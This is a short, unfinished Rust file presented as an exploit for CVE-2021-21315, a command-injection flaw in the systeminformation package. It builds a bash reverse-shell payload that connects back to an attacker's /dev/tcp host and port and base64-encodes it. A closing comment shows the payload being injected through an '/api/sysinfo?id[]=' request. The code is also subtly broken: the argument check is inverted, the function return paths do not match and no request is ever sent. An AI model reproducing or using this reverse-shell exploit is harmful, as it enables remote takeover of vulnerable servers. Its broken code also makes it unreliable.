use std::env;

fn init() -> [String;3]{
    
    let banner = "
    +----------------------------------------+
    |                                        |
    |       CVE - 2021 - 21315 exploit       |
    |                                        |
    +----------------------------------------+
    
    https://github.com/Ki11i0n4ir3/
    
    ";
    
    let args: Vec<String> = env::args().collect();
    if args.len() != 1{
        println!("[!]NeedMoreArgument");
        println!("[+]Usage");
        println!("{} <Target_host> <LocalHost> <LocalPort>",&args[0]);
    }else{
        println!("{}",banner);
        
        let info_array = [args[0],args[1],args[2]];
        
        info_array
    }
}

fn payload_crafter(lhost: &String, lport: &String) -> String{
    
    let payload = format!("bash -i >& /dev/tcp/{}/{} 0>&1",lhost,lport);
    let encoded_payload = base64::encode(payload);
    
    
}

fn main(){
    
    let info_array = init();
    let payload = payload_crafter(info_array[1],info_array[2]);
          
}


// payload = bash -i >& /dev/tcp/{lhost}/{lport} 0> &1
// payload is must encode into base64
// encode again to URLencoding... 
// http://{tagetURL}/api/sysinfo?id[]={payload}

